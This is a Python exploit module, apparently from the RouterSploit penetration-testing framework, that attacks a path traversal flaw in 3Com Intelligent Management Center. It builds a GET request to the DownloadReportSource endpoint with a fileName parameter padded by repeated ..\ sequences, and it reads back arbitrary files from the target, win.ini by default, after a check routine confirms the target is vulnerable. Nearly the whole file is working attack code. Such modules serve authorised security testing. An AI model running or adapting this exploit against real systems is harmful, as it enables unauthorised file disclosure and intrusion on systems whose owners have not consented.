from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "3Com IMC Path Traversal",
        "description": "Exploits 3Com Intelligent Management Center path traversal vulnerability. "
                       "If the target is vulnerable it is possible to read file from the filesystem.",
        "authors": (
            "Richard Brain",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/12679/",
        ),
        "devices": (
            "3Com Intelligent Management Center",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    filename = OptString("\\windows\\win.ini", "File to read from the filesystem")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            print_status("Sending paylaod request")

            path = "/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..{}".format(self.filename)
            response = self.http_request(
                method="GET",
                path=path,
            )

            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Exploit success - reading {} file".format(self.filename))
                print_info(response.text)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        )

        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "[fonts]" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
